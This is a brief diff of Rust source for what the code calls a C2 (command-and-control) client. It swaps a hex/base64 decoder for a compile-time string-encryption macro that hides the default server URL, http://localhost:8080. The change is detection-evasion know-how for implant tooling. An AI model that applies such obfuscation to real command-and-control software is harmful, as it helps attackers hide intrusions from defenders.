@@ -1,4 +1,3 @@
-use cryptify;
 use reqwest::Client;
 use std::time::Duration;
 use tokio::time::sleep;
@@ -10,7 +9,6 @@ mod gadgets;
 use common::config::ClientConfig;
 use common::error::C2Result;
 use common::message::{CommandRequest, Message, MessageType};
-use gadgets::simple_decode;
 
 /// C2 Client
 pub struct C2Client {
@@ -120,7 +118,7 @@ impl C2Client {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args: Vec<String> = std::env::args().collect();
     let server_url = args.get(1).map(|s| s.to_string()).unwrap_or_else(|| {
-        simple_decode("6148523063446f764c327876593246736147397a64446f344d446777")
+        cryptify::encrypt_string!("http://localhost:8080").to_string()
     });
 
     let config = ClientConfig::default();
